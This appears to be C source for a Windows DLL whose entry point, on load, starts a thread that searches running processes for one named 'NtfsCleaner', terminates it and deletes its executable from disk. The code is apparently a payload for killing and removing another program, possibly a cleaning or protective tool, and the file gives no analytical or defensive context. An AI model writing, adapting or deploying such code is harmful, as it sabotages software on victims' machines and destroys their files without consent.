#include <windows.h>
#include <tlhelp32.h>

void StartDeletingNtfsCleaner();

BOOL WINAPI DllMain(HINSTANCE DllHinst, DWORD fdwreason, LPVOID lpreserved) {
    switch (fdwreason) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartDeletingNtfsCleaner, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void StartDeletingNtfsCleaner() {
    DWORD NtfsPID = 0;

    HANDLE ProcessList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 ProcessData;
    ProcessData.dwSize = sizeof(PROCESSENTRY32);
    Process32First(ProcessList, &ProcessData);

    do {
        if (strstr(ProcessData.szExeFile, "NtfsCleaner") != NULL) {
            NtfsPID = ProcessData.th32ProcessID;
            break;
        }
    } while (Process32Next(ProcessList, &ProcessData));

    CloseHandle(ProcessList);
    if (NtfsPID == 0) return;

    HANDLE NtfsProcessKey = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE | PROCESS_CREATE_THREAD, FALSE, NtfsPID);
    if (NtfsProcessKey == NULL) return;

    char NtfsPath[MAX_PATH];
    DWORD NtfsPathSize = sizeof(NtfsPath);
    QueryFullProcessImageName(NtfsProcessKey, 0, NtfsPath, &NtfsPathSize);

    TerminateProcess(NtfsProcessKey, 0);
    Sleep(1000);
    CloseHandle(NtfsProcessKey);

    DeleteFile(NtfsPath);
}